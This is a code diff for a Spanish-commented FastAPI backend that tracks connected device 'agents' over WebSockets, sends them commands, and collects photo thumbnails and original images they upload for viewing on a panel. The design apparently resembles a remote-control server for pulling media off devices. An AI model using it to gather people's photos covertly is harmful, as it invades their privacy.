@@ -1,3 +1,4 @@
+
 import json
 import base64
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, UploadFile, File
@@ -6,16 +7,17 @@ from pydantic import BaseModel
 from typing import List, Dict, Any
 from urllib.parse import unquote
 
-app = FastAPI(title="Agente Control Backend (Subida Bajo Demanda)")
+app = FastAPI(title="Agente Control Backend (vFINAL Corregido)")
 app.add_middleware(
     CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
 )
 
-# --- BASE DE DATOS EN MEMORIA MEJORADA ---
-# Formato: { "device_id": { "filename.jpg": { "small_thumb_b64": "...", "original_b64": "..." } } }
+# --- "BASE DE DATOS" EN MEMORIA ---
+# ¡LÍNEA RESTAURADA! Aquí se crea el diccionario para los agentes conectados.
+connected_agents: Dict[str, Dict[str, Any]] = {}
 device_media_cache: Dict[str, Dict[str, Dict[str, str]]] = {}
 
-# --- MODELOS DE DATOS SIMPLIFICADOS ---
+# --- MODELOS DE DATOS ---
 class Command(BaseModel):
     target_id: str
     action: str
@@ -33,9 +35,10 @@ class ThumbnailChunk(BaseModel):
 
 @app.websocket("/ws/{device_id}/{device_name:path}")
 async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
+    device_name_decoded = unquote(device_name)
     await websocket.accept()
-    print(f"[CONEXIÓN] Agente conectado: '{unquote(device_name)}' (ID: {device_id})")
-    connected_agents[device_id] = {"ws": websocket, "name": unquote(device_name)}
+    print(f"[CONEXIÓN] Agente conectado: '{device_name_decoded}' (ID: {device_id})")
+    connected_agents[device_id] = {"ws": websocket, "name": device_name_decoded}
     try:
         while True:
             await websocket.receive_text()
@@ -72,22 +75,18 @@ async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
     print(f"Recibidas {len(chunk.thumbnails)} miniaturas de {device_id[:8]}.")
     return {"status": "chunk received"}
 
-# --- ¡NUEVA RUTA PARA RECIBIR EL ARCHIVO ORIGINAL! ---
 @app.post("/api/upload_original_file/{device_id}/{filename:path}")
 async def upload_original_file(device_id: str, filename: str, file: UploadFile = File(...)):
     if device_id not in device_media_cache or filename not in device_media_cache[device_id]:
-        return Response(content="Archivo no solicitado o agente desconocido", status_code=400)
-    
+        return Response(content="Archivo no solicitado", status_code=400)
     file_bytes = await file.read()
     original_b64 = base64.b64encode(file_bytes).decode('utf-8')
     device_media_cache[device_id][filename]['original_b64'] = original_b64
-    
     print(f"Recibido archivo original '{filename}' de {device_id[:8]}.")
     return {"status": "success"}
 
 @app.get("/api/get_media_list/{device_id}")
 async def get_media_list(device_id: str):
-    # La respuesta ahora es un diccionario, no una lista, para que el panel pueda acceder a los datos
     return device_media_cache.get(device_id, {})
 
 @app.get("/media/{device_id}/{filename:path}")
@@ -95,7 +94,7 @@ async def get_large_media(device_id: str, filename: str):
     cache = device_media_cache.get(device_id, {})
     media_item = cache.get(filename)
     if not media_item or 'original_b64' not in media_item:
-        return Response(content='{"detail":"Archivo original no disponible en el servidor. Pide al agente que lo suba."}', status_code=404)
+        return Response(content='{"detail":"Archivo original no disponible"}', status_code=404)
     try:
         image_bytes = base64.b64decode(media_item['original_b64'])
         return Response(content=image_bytes, media_type="image/jpeg")
